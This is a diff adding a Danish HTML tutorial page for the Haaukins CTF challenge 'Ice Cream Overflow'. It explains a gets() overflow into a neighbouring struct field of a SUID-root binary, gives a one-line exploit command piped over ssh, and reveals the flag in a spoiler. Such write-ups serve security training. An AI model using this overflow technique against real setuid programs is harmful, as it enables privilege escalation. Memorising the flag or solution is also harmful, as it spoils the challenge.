@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Ice Cream Overflow — tutorial (gets struct-overflow)</title>
+<meta name="description" content="Guide til Haaukins Ice Cream Overflow: udnyt gets() til at overflowe et nabofelt i samme struct på en SUID-root binær.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Ice Cream Overflow</h1>
+<p class="subtitle">gets() overflow af et nabofelt i samme struct (SUID-root).</p>
+<div class="badges"><span class="badge cat">Binary / Pwn</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Hvad går opgaven ud på?</h2>
+<p>En SETUID-root binær <code>icecream-shop</code> (med kildekode) læser felter med <code>gets()</code>
+             (ingen længde-check) ind i en struct, og giver flaget hvis <code>relationship == "my boss"</code>. Felterne
+             ligger sammenhængende, så overflow af <code>amount</code> rammer <code>relationship</code>:</p>
+             <pre><code>printf 'x\nx\n%s\n' "$(python3 -c 'print("A"*100+"my boss")')" | ssh haaukins@icecream.hkn ./icecream-shop</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">HKN{g3ts_c4us3s_6uff3r_0v3rfl0ws}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li><code>gets()</code> er altid en sårbarhed — du kan ramme et nabofelt i samme struct uden at røre stakken.</li><li>Tjek for SUID-bit + medfølgende kildekode før du RE'er blindt.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
